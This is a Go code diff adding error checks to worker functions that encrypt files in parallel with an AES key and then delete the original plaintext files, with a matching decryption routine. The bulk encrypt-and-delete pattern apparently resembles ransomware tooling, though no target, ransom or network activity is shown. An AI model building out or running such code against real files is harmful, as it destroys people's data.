@@ -20,7 +20,10 @@ func encryptFileTask(task FileTask, aesKey []byte, id int) {
 	fileEncryptor := aeskeys.NewEncryptor(aesKey, task.InputFilePath, task.OutputFilePath, task.DecryptedPath)
 
 	// Perform encryption
-	fileEncryptor.Encrypt(id)
+	if err := fileEncryptor.Encrypt(id); err != nil {
+		log.Printf("[-] [Worker %d] Failed to encrypt %s: %v\n", id, task.InputFilePath, err)
+		return
+	}
 	log.Printf("[+] [Worker %d] File %s encrypted successfully\n", id, task.InputFilePath)
 
 	// Delete the original plaintext file
@@ -70,11 +73,18 @@ func EncryptFilesInParallel(aesKey []byte, files []FileTask, numWorkers int) {
 
 // Orchestrates the decryption for files
 func DecryptFileTask(aesKey []byte, task FileTask, id int) {
-	decryptor := aeskeys.NewAESDecryptor(aesKey, task.InputFilePath)
-	decryptor.DecryptFile(task.DecryptedPath, id)
+	decryptor, err := aeskeys.NewAESDecryptor(aesKey, task.InputFilePath)
+	if err != nil {
+		log.Printf("[-] [Worker %d] Failed to initialize decryptor for %s: %v\n", id, task.InputFilePath, err)
+		return
+	}
+	if err := decryptor.DecryptFile(task.DecryptedPath, id); err != nil {
+		log.Printf("[-] [Worker %d] Failed to decrypt %s: %v\n", id, task.InputFilePath, err)
+		return
+	}
 
 	// Delete the original plaintext file
-	err := os.Remove(task.InputFilePath)
+	err = os.Remove(task.InputFilePath)
 	if err != nil {
 		log.Printf("[-] [Worker %d] Error deleting file %s: %v\n", id, task.InputFilePath, err)
 	} else {
